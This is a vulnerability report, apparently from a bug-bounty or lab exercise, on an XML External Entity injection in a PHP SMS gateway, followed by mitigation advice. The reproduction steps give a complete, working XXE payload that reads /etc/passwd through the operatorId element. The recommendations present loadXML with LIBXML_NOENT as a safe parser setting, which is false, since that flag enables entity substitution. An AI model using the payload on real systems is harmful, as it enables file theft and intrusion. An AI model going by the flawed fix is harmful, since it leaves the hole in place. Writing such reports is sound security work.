# XML External Entity (XXE) Injection - SMS Gateway

## Summary

I identified an XML External Entity (XXE) Injection vulnerability in the SMS gateway functionality of the application.

The application accepts user-controlled XML input through a POST request to send SMS messages. The XML parser is configured to process external entity definitions without proper restrictions, allowing an attacker to read arbitrary files from the server. By defining an external entity that references a local file, an attacker can cause the application to include the file's contents in the error response.

An attacker can craft a malicious XML payload that reads sensitive files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**XML External Entity (XXE) Injection**

## Vulnerable Parameter

```text
operatorId (XML element)
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/sms/index.php
```

## Steps to Reproduce

1. Navigate to the vulnerable SMS gateway at `https://kzlabs.in/subdomains/sms/index.php`.

2. Intercept the request using Burp Suite or a similar proxy tool.

3. Replace the XML body with the following XXE payload:

   ```xml
   <?xml version="1.0" encoding="ISO-8859-1" ?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <operation type="deliver">
     <account username="sxmp_user" password="key"/>
     <deliverRequest referenceId="REF1789567704712">
       <operatorId>&xxe;</operatorId>
       <sourceAddress type="network">40404</sourceAddress>
       <destinationAddress type="international">+1555012345</destinationAddress>
       <text encoding="ISO-8859-1">Your verification code is 847291</text>
     </deliverRequest>
   </operation>
   ```

4. Send the request.

5. Observe that the response contains the contents of `/etc/passwd` embedded in the XML `<error>` element.

The response includes the full contents of `/etc/passwd` in the error message, confirming the XXE vulnerability. The application's error code `1010` (Invalid type) indicates that it attempted to convert the entity value but exposed the file contents in the process.

## Impact

An attacker can:

- Read arbitrary files from the server (`/etc/passwd`, `/etc/shadow`, application config files)
- Extract sensitive credentials (database passwords, API keys)
- Perform Server-Side Request Forgery (SSRF) to access internal services
- Perform denial of service (billion laughs attack)
- Potentially achieve Remote Code Execution (RCE) via PHP filter chains or by reading sensitive files
- Enumerate internal network services
- Bypass authentication by reading session files or configuration

## Recommendation

To mitigate this vulnerability:

- **Disable External Entities**: Configure the XML parser to disable DTDs and external entities.
  ```php
  libxml_disable_entity_loader(true);
  ```

- **Use Safe XML Parsers**: Use parsers that do not process external entities by default.
  ```php
  $doc = new DOMDocument();
  $doc->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
  ```

- **Use JSON Instead of XML**: If possible, replace XML with JSON for data exchange.

- **Validate XML Input**: Reject any XML containing DOCTYPE declarations or entity definitions.
  ```php
  if (preg_match('/<!DOCTYPE|<!ENTITY/i', $xml)) {
      die("XML not allowed.");
  }
  ```

- **Use `libxml_set_external_entity_loader`**: Set a custom entity loader that returns null.
  ```php
  libxml_set_external_entity_loader(function() { return null; });
  ```

- **Upgrade PHP**: Use PHP 8.0+ where external entity loading is disabled by default.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block XXE payloads.

- **Error Handling**: Ensure error messages do not include sensitive file contents.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
